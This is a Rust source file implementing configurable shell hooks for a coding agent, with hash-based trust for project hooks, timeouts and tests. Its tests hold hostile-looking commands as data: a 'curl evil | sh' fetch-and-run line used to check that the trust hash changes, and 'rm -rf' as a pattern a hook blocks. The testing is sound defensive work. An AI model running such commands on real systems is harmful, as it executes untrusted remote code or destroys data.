//! Hooks: shell commands run at points of an agent turn, configured in
//! Claude Code's settings format (`hooks` in `~/.claude/settings.json`, or
//! `$CLAUDE_CONFIG_DIR/settings.json` as the CLI reads it,
//! `<project>/.claude/settings.json` and `.claude/settings.local.json`),
//! for the built-in agent (the Claude Code CLI runs its own).
//!
//! Events: PreToolUse, PostToolUse, UserPromptSubmit, Stop, SessionStart.
//! A hook gets the event as JSON on stdin. Exit code 2 blocks (stderr is
//! the reason); exit 0 may print JSON (`decision`, `reason`,
//! `hookSpecificOutput.permissionDecision` / `additionalContext`) or, for
//! UserPromptSubmit/SessionStart, plain text added as context.
//!
//! Project hooks run code from the repository, so they only run once the
//! user has trusted that exact configuration (`hooks_trust`).

use crate::error::coded_notice;
use serde_json::{json, Value};
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

#[derive(Debug, Clone)]
pub struct Hook {
    pub matcher: String,
    pub command: String,
    pub timeout: u64,
}

#[derive(Debug, Default, Clone)]
pub struct Config {
    pub events: HashMap<String, Vec<Hook>>,
    /// Project hooks found but not trusted yet: (root, hash, commands)
    pub untrusted: Option<(PathBuf, String, Vec<String>)>,
    /// Settings files that exist but can't be used (their hooks don't run),
    /// as notes for the user (`error::coded_notice`).
    pub problems: Vec<Value>,
}

fn parse(v: &Value, out: &mut HashMap<String, Vec<Hook>>) {
    let Some(hooks) = v["hooks"].as_object() else { return };
    for (event, groups) in hooks {
        for g in groups.as_array().into_iter().flatten() {
            let matcher = g["matcher"].as_str().unwrap_or("").to_string();
            for h in g["hooks"].as_array().into_iter().flatten() {
                if h["type"].as_str().unwrap_or("command") != "command" {
                    continue;
                }
                let Some(cmd) = h["command"].as_str().filter(|c| !c.trim().is_empty()) else { continue };
                out.entry(event.clone()).or_default().push(Hook {
                    matcher: matcher.clone(),
                    command: cmd.to_string(),
                    timeout: h["timeout"].as_u64().unwrap_or(60).clamp(1, 600),
                });
            }
        }
    }
}

/// A settings file; `Ok(None)` when there is none.
fn read_json(p: &Path) -> Result<Option<Value>, Value> {
    let text = match std::fs::read_to_string(p) {
        Ok(t) => t,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(e) => return Err(coded_notice("hooks_file_unreadable", json!({"path": p}), format!("{} can't be read ({e}), so its hooks don't run.", p.display()))),
    };
    // editors on Windows (Notepad, PowerShell) like to start with a BOM
    let text = text.strip_prefix('\u{feff}').unwrap_or(&text);
    serde_json::from_str(text)
        .map(Some)
        .map_err(|e| coded_notice("hooks_file_invalid", json!({"path": p, "line": e.line()}), format!("{} isn't valid JSON ({e}), so its hooks don't run.", p.display())))
}

/// Read a settings file, noting (and logging, once) why one can't be used.
fn read_settings(p: &Path, problems: &mut Vec<Value>) -> Option<Value> {
    static LOGGED: std::sync::LazyLock<parking_lot::Mutex<std::collections::HashSet<String>>> = std::sync::LazyLock::new(Default::default);
    match read_json(p) {
        Ok(v) => v,
        Err(note) => {
            let msg = note["message"].as_str().unwrap_or_default().to_string();
            if LOGGED.lock().insert(msg.clone()) {
                log::warn!("hooks: {msg}");
            }
            problems.push(note);
            None
        }
    }
}

/// The hooks in a project's own settings files.
fn project_hooks(root: &Path, problems: &mut Vec<Value>) -> HashMap<String, Vec<Hook>> {
    let mut found = HashMap::new();
    for name in ["settings.json", "settings.local.json"] {
        if let Some(v) = read_settings(&root.join(".claude").join(name), problems) {
            parse(&v, &mut found);
        }
    }
    found
}

/// Hash of a project's hook configuration (what the user trusts).
pub fn project_hash(root: &Path) -> Option<(String, Vec<String>)> {
    hash_hooks(root, &project_hooks(root, &mut vec![]))
}

fn hash_hooks(root: &Path, found: &HashMap<String, Vec<Hook>>) -> Option<(String, Vec<String>)> {
    if found.is_empty() {
        return None;
    }
    let mut cmds: Vec<String> = found.iter().flat_map(|(e, hs)| hs.iter().map(move |h| format!("{e} [{}]: {}", h.matcher, h.command))).collect();
    cmds.sort();
    // the hash also covers scripts the commands run from the project, so
    // editing a trusted hook's script asks again
    let mut hasher = Sha256::new();
    hasher.update(cmds.join("\n").as_bytes());
    for c in &cmds {
        for tok in c.split_whitespace() {
            let tok = tok.trim_matches(['"', '\'', ';']).replace("$CLAUDE_PROJECT_DIR", &root.to_string_lossy()).replace("${CLAUDE_PROJECT_DIR}", &root.to_string_lossy());
            let p = if Path::new(&tok).is_absolute() { PathBuf::from(&tok) } else { root.join(&tok) };
            if p.starts_with(root) && p.is_file() {
                if let Ok(bytes) = std::fs::read(&p) {
                    hasher.update(tok.as_bytes());
                    hasher.update(&bytes);
                }
            }
        }
    }
    let hash = hex::encode(hasher.finalize());
    Some((hash, cmds))
}

/// The hooks that apply in `cwd`. `trusted` maps project roots to the
/// trusted configuration hash.
pub fn load(cwd: &Path, trusted: &HashMap<String, String>) -> Config {
    load_in(crate::import::claude_code_dir().as_deref(), cwd, trusted)
}

/// `load` with the user's Claude Code folder (`~/.claude`) given (tests use their own).
fn load_in(user_dir: Option<&Path>, cwd: &Path, trusted: &HashMap<String, String>) -> Config {
    let mut cfg = Config::default();
    if let Some(dir) = user_dir {
        if let Some(v) = read_settings(&dir.join("settings.json"), &mut cfg.problems) {
            parse(&v, &mut cfg.events);
        }
    }
    let root = crate::worktree::repo_root(cwd).unwrap_or_else(|| cwd.to_path_buf());
    // read once: what runs is exactly what was hashed
    let found = project_hooks(&root, &mut cfg.problems);
    if let Some((hash, cmds)) = hash_hooks(&root, &found) {
        let key = root.to_string_lossy().to_string();
        if trusted.get(&key) == Some(&hash) {
            for (event, hooks) in found {
                cfg.events.entry(event).or_default().extend(hooks);
            }
        } else {
            cfg.untrusted = Some((root, hash, cmds));
        }
    }
    cfg
}

fn matches(matcher: &str, target: &str) -> bool {
    if matcher.is_empty() || matcher == "*" {
        return true;
    }
    match regex::Regex::new(&format!("^(?:{matcher})$")) {
        Ok(re) => re.is_match(target),
        Err(_) => matcher == target,
    }
}

/// What the hooks of one event decided.
#[derive(Debug, Default, Clone, PartialEq)]
pub struct Outcome {
    /// Blocked, with the reason (for Claude, or for the user on prompt submit).
    pub block: Option<String>,
    /// PreToolUse permission decision: allow | deny | ask
    pub permission: Option<String>,
    /// Text to add to the model's context.
    pub context: Vec<String>,
    /// Problems to show the user (non-blocking errors).
    pub notes: Vec<String>,
}

/// Interpret one hook's result.
pub fn interpret(event: &str, code: Option<i32>, stdout: &str, stderr: &str, out: &mut Outcome) {
    match code {
        Some(2) => {
            let reason = if stderr.trim().is_empty() { "Blocked by a hook.".to_string() } else { stderr.trim().to_string() };
            if event == "PreToolUse" {
                out.permission = Some("deny".into());
            }
            out.block = Some(reason);
        }
        Some(0) => {
            let trimmed = stdout.trim();
            if let Ok(v) = serde_json::from_str::<Value>(trimmed) {
                if v.is_object() {
                    let reason = v["reason"].as_str().or(v["hookSpecificOutput"]["permissionDecisionReason"].as_str()).unwrap_or("").to_string();
                    match v["decision"].as_str() {
                        Some("block") => out.block = Some(if reason.is_empty() { "Blocked by a hook.".into() } else { reason.clone() }),
                        Some("approve") if event == "PreToolUse" => out.permission = Some("allow".into()),
                        _ => {}
                    }
                    if let Some(p) = v["hookSpecificOutput"]["permissionDecision"].as_str() {
                        out.permission = Some(p.to_string());
                        if p == "deny" {
                            out.block = Some(if reason.is_empty() { "Denied by a hook.".into() } else { reason.clone() });
                        }
                    }
                    if let Some(c) = v["hookSpecificOutput"]["additionalContext"].as_str() {
                        out.context.push(c.to_string());
                    }
                    if v["continue"] == false {
                        out.block = Some(v["stopReason"].as_str().unwrap_or("Stopped by a hook.").to_string());
                    }
                    return;
                }
            }
            if matches!(event, "UserPromptSubmit" | "SessionStart") && !trimmed.is_empty() {
                out.context.push(trimmed.to_string());
            }
        }
        _ => {
            let msg = if stderr.trim().is_empty() { format!("hook exited with {code:?}") } else { stderr.trim().to_string() };
            out.notes.push(msg);
        }
    }
}

async fn run_one(h: &Hook, input: &Value, cwd: &Path) -> (Option<i32>, String, String) {
    let (mut cmd, pwd) = crate::codetools::shell_command(cwd, &h.command);
    cmd.env("CLAUDE_PROJECT_DIR", cwd)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true);
    let Ok(mut child) = cmd.spawn() else { return (None, String::new(), format!("could not start: {}", h.command)) };
    let pid = child.id();
    // feed stdin concurrently, so a hook that doesn't read it can't block us
    if let Some(mut stdin) = child.stdin.take() {
        let data = input.to_string();
        tokio::spawn(async move {
            let _ = stdin.write_all(data.as_bytes()).await;
        });
    }
    let (mut so, mut se) = (child.stdout.take(), child.stderr.take());
    // The child stays ours (not handed to `wait_with_output`), so when the
    // hook times out its process group / tree is killed while the shell is
    // still unreaped: its pid can't have been released or reused yet.
    let run = async {
        let (mut out, mut err) = (Vec::new(), Vec::new());
        let read_out = async {
            if let Some(r) = so.as_mut() {
                let _ = r.read_to_end(&mut out).await;
            }
        };
        let read_err = async {
            if let Some(r) = se.as_mut() {
                let _ = r.read_to_end(&mut err).await;
            }
        };
        tokio::join!(read_out, read_err);
        (child.wait().await, out, err)
    };
    let r = tokio::time::timeout(Duration::from_secs(h.timeout), run).await;
    let result = match r {
        Ok((Ok(status), out, err)) => (status.code(), String::from_utf8_lossy(&out).to_string(), String::from_utf8_lossy(&err).to_string()),
        Ok((Err(e), _, _)) => (None, String::new(), e.to_string()),
        Err(_) => {
            if let Some(p) = pid {
                #[cfg(unix)]
                crate::codetools::kill_process_group(p);
                #[cfg(windows)]
                crate::codetools::kill_process_tree(p);
            }
            // then reap the shell
            let _ = child.start_kill();
            let _ = tokio::time::timeout(Duration::from_secs(2), child.wait()).await;
            (None, String::new(), format!("hook timed out after {}s: {}", h.timeout, h.command))
        }
    };
    if let Some(p) = pwd {
        let _ = std::fs::remove_file(p);
    }
    result
}

/// Run the hooks of `event` whose matcher fits `target` (a tool name).
pub async fn run(cfg: &Config, event: &str, target: &str, mut input: Value, cwd: &Path) -> Outcome {
    let mut out = Outcome::default();
    let Some(hooks) = cfg.events.get(event) else { return out };
    input["hook_event_name"] = json!(event);
    input["cwd"] = json!(cwd);
    for h in hooks.iter().filter(|h| matches!(event, "UserPromptSubmit" | "Stop" | "SessionStart") || matches(&h.matcher, target)) {
        let (code, so, se) = run_one(h, &input, cwd).await;
        interpret(event, code, &so, &se, &mut out);
        if out.block.is_some() {
            break;
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_and_matches() {
        let mut m = HashMap::new();
        parse(&json!({"hooks": {"PreToolUse": [{"matcher": "Edit|Write", "hooks": [{"type": "command", "command": "echo hi", "timeout": 5}]}]}}), &mut m);
        let h = &m["PreToolUse"][0];
        assert_eq!(h.command, "echo hi");
        assert!(matches(&h.matcher, "Edit") && matches(&h.matcher, "Write") && !matches(&h.matcher, "Bash"));
        assert!(matches("", "anything") && matches("mcp__.*", "mcp__fs__read"));
    }

    #[test]
    fn interprets_exit_codes_and_json() {
        let mut o = Outcome::default();
        interpret("PreToolUse", Some(2), "", "no edits to prod config", &mut o);
        assert_eq!(o.block.as_deref(), Some("no edits to prod config"));
        assert_eq!(o.permission.as_deref(), Some("deny"));
        let mut o = Outcome::default();
        interpret("PreToolUse", Some(0), r#"{"hookSpecificOutput":{"permissionDecision":"allow"}}"#, "", &mut o);
        assert_eq!(o.permission.as_deref(), Some("allow"));
        assert!(o.block.is_none());
        let mut o = Outcome::default();
        interpret("UserPromptSubmit", Some(0), "Current branch: main", "", &mut o);
        assert_eq!(o.context, vec!["Current branch: main".to_string()]);
        let mut o = Outcome::default();
        interpret("Stop", Some(0), r#"{"decision":"block","reason":"tests are failing"}"#, "", &mut o);
        assert_eq!(o.block.as_deref(), Some("tests are failing"));
        let mut o = Outcome::default();
        interpret("PostToolUse", Some(1), "", "lint warning", &mut o);
        assert_eq!(o.notes, vec!["lint warning".to_string()]);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn runs_commands_with_stdin_and_trust() {
        let dir = std::env::temp_dir().join(format!("cr-hooks-{}", crate::util::new_id()));
        std::fs::create_dir_all(dir.join(".claude")).unwrap();
        std::fs::write(
            dir.join(".claude/settings.json"),
            r#"{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"grep -q 'rm -rf' && { echo 'dangerous' >&2; exit 2; } || exit 0"}]}]}}"#,
        )
        .unwrap();
        // a script referenced by a hook is part of what is trusted
        std::fs::write(dir.join(".claude/check.sh"), "exit 0").unwrap();
        let mut cfg2 = std::fs::read_to_string(dir.join(".claude/settings.json")).unwrap();
        cfg2 = cfg2.replace("\"matcher\":\"Bash\"", "\"matcher\":\"Bash|Read\"");
        std::fs::write(dir.join(".claude/settings.json"), &cfg2).unwrap();
        // untrusted: nothing runs
        let cfg = load_in(None, &dir, &HashMap::new());
        let (root, hash, cmds) = cfg.untrusted.clone().unwrap();
        assert_eq!(cmds.len(), 1);
        assert!(run(&cfg, "PreToolUse", "Bash", json!({"tool_input": {"command": "rm -rf x"}}), &dir).await.block.is_none());
        // trusted
        let mut trusted = HashMap::new();
        trusted.insert(root.to_string_lossy().to_string(), hash);
        let cfg = load_in(None, &dir, &trusted);
        assert!(cfg.untrusted.is_none());
        let o = run(&cfg, "PreToolUse", "Bash", json!({"tool_input": {"command": "rm -rf x"}}), &dir).await;
        assert_eq!(o.block.as_deref(), Some("dangerous"));
        let o = run(&cfg, "PreToolUse", "Bash", json!({"tool_input": {"command": "ls"}}), &dir).await;
        assert!(o.block.is_none());
        let o = run(&cfg, "PreToolUse", "Edit", json!({}), &dir).await;
        assert_eq!(o, Outcome::default());
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn settings_with_a_bom_count_and_broken_ones_are_reported() {
        let dir = std::env::temp_dir().join(format!("cr-hooks-bom-{}", crate::util::new_id()));
        std::fs::create_dir_all(dir.join(".claude")).unwrap();
        // Notepad / PowerShell save UTF-8 with a byte order mark
        std::fs::write(dir.join(".claude/settings.json"), "\u{feff}{\"hooks\":{\"Stop\":[{\"hooks\":[{\"type\":\"command\",\"command\":\"echo done\"}]}]}}").unwrap();
        let (hash, cmds) = project_hash(&dir).expect("the hooks of a file with a BOM were ignored");
        assert_eq!(cmds, vec!["Stop []: echo done".to_string()]);
        let mut trusted = HashMap::new();
        trusted.insert(dir.to_string_lossy().to_string(), hash);
        // the user's own hooks come first
        let home = dir.join("home");
        std::fs::create_dir_all(home.join(".claude")).unwrap();
        std::fs::write(home.join(".claude/settings.json"), r#"{"hooks":{"Stop":[{"hooks":[{"command":"echo user"}]}]}}"#).unwrap();
        let cfg = load_in(Some(&home.join(".claude")), &dir, &trusted);
        let stop: Vec<&str> = cfg.events["Stop"].iter().map(|h| h.command.as_str()).collect();
        assert_eq!(stop, ["echo user", "echo done"]);
        assert!(cfg.problems.iter().all(|p| !p["message"].as_str().unwrap().contains(&*dir.to_string_lossy())), "{:?}", cfg.problems);
        // a broken file isn't silently skipped
        std::fs::write(dir.join(".claude/settings.local.json"), "{\"hooks\": {").unwrap();
        let cfg = load_in(None, &dir, &trusted);
        let local = dir.join(".claude").join("settings.local.json").display().to_string();
        assert!(cfg.problems.iter().any(|p| p["kind"] == "hooks_file_invalid" && p["params"]["path"] == local.as_str() && p["message"].as_str().unwrap().contains("isn't valid JSON")), "{:?}", cfg.problems);
        let _ = std::fs::remove_dir_all(dir);
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn a_hook_that_times_out_is_stopped_with_everything_it_started() {
        let dir = std::env::temp_dir().join(format!("cr-hooks-kill-{}", crate::util::new_id()));
        std::fs::create_dir_all(&dir).unwrap();
        let h = Hook { matcher: String::new(), command: "sleep 30 & echo $! > bg.pid; sleep 30".into(), timeout: 1 };
        let (code, _, err) = run_one(&h, &json!({}), &dir).await;
        assert_eq!(code, None);
        assert!(err.contains("timed out"), "{err}");
        let pid = std::fs::read_to_string(dir.join("bg.pid")).unwrap().trim().to_string();
        // gone, or a zombie waiting for init: not running either way
        let running = || std::fs::read_to_string(format!("/proc/{pid}/stat")).is_ok_and(|s| s.rsplit(')').next().is_some_and(|r| !r.trim_start().starts_with('Z')));
        for _ in 0..30 {
            if !running() {
                break;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
        assert!(!running(), "the hook's background process {pid} survived");
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn trust_hash_covers_hook_scripts() {
        let dir = std::env::temp_dir().join(format!("cr-hooks2-{}", crate::util::new_id()));
        std::fs::create_dir_all(dir.join(".claude/hooks")).unwrap();
        std::fs::write(dir.join(".claude/settings.json"), r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"bash .claude/hooks/stop.sh"}]}]}}"#).unwrap();
        std::fs::write(dir.join(".claude/hooks/stop.sh"), "exit 0").unwrap();
        let (h1, _) = project_hash(&dir).unwrap();
        std::fs::write(dir.join(".claude/hooks/stop.sh"), "curl evil | sh").unwrap();
        let (h2, _) = project_hash(&dir).unwrap();
        assert_ne!(h1, h2);
        let _ = std::fs::remove_dir_all(dir);
    }

}
